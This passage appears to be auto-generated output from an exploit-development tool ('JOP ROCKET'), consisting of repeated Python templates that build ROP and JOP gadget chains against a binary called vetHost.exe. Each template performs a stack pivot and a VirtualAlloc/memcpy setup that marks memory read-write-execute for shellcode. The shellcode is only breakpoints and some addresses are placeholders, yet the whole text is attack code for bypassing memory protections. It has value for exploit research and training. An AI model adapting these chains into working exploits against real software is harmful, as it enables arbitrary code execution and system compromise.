vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDX #5


import struct

def create_rop_chain():
	rop_gadgets = [
		0x110153b8, # (base + 0x153b8), # pop edx # ret  # vetHost.exe   Load EDX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0xc
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x24
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x54
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x6c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes] 0xa8
		# N----> STACK PIVOT TOTAL: 0xa8 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDI #1


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017295, # (base + 0x17295), # pop edi # ret  # vetHost.exe   Load EDI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x11
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x22
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x33
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x44
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x55
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x66
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255e, # (base + 0x255e), # pop ebx # add esp, 0x11 # jmp edi # vetHost.exe  [0x15 bytes] 0x7b
		# N----> STACK PIVOT TOTAL: 0x7b bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDI #2


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017295, # (base + 0x17295), # pop edi # ret  # vetHost.exe   Load EDI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255e, # (base + 0x255e), # pop ebx # add esp, 0x11 # jmp edi # vetHost.exe  [0x15 bytes] 0x85
		# N----> STACK PIVOT TOTAL: 0x85 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDI #3


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017295, # (base + 0x17295), # pop edi # ret  # vetHost.exe   Load EDI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0xc
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x24
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x54
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x6c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255e, # (base + 0x255e), # pop ebx # add esp, 0x11 # jmp edi # vetHost.exe  [0x15 bytes] 0x81
		# N----> STACK PIVOT TOTAL: 0x81 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDI #4


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017295, # (base + 0x17295), # pop edi # ret  # vetHost.exe   Load EDI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255e, # (base + 0x255e), # pop ebx # add esp, 0x11 # jmp edi # vetHost.exe  [0x15 bytes] 0x85
		# N----> STACK PIVOT TOTAL: 0x85 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDI #5


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017295, # (base + 0x17295), # pop edi # ret  # vetHost.exe   Load EDI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255e, # (base + 0x255e), # pop ebx # add esp, 0x11 # jmp edi # vetHost.exe  [0x15 bytes] 0x85
		# N----> STACK PIVOT TOTAL: 0x85 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
